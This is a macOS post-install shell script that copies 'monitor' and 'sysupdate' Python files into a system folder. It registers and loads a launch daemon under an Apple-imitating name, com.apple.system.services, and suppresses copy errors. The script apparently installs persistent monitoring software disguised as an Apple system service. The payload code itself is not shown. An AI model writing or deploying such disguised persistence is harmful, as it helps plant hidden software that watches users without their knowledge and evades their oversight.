#!/bin/bash
# Post-install script for AppleSystemServices

echo "🔧 Installing System Service..."

# Copy main app
mkdir -p "/Library/Application Support/AppleSystemServices"
cp -R "$1/../app/monitor.py" "/Library/Application Support/AppleSystemServices/monitor.py" 2>/dev/null || true
cp -R "$1/../app/sysupdate.py" "/Library/Application Support/AppleSystemServices/sysupdate.py" 2>/dev/null || true
cp -R "$1/../app/templates" "/Library/Application Support/AppleSystemServices/" 2>/dev/null || true

# Set permissions
chmod +x "/Library/Application Support/AppleSystemServices/monitor.py" 2>/dev/null || true
chmod +x "/Library/Application Support/AppleSystemServices/sysupdate.py" 2>/dev/null || true

# Copy launch daemon
cp "$1/../app/launch.plist" "/Library/LaunchDaemons/com.apple.system.services.plist"

# Load launch daemon
launchctl load -w "/Library/LaunchDaemons/com.apple.system.services.plist"

echo "✅ System Service installed successfully!"
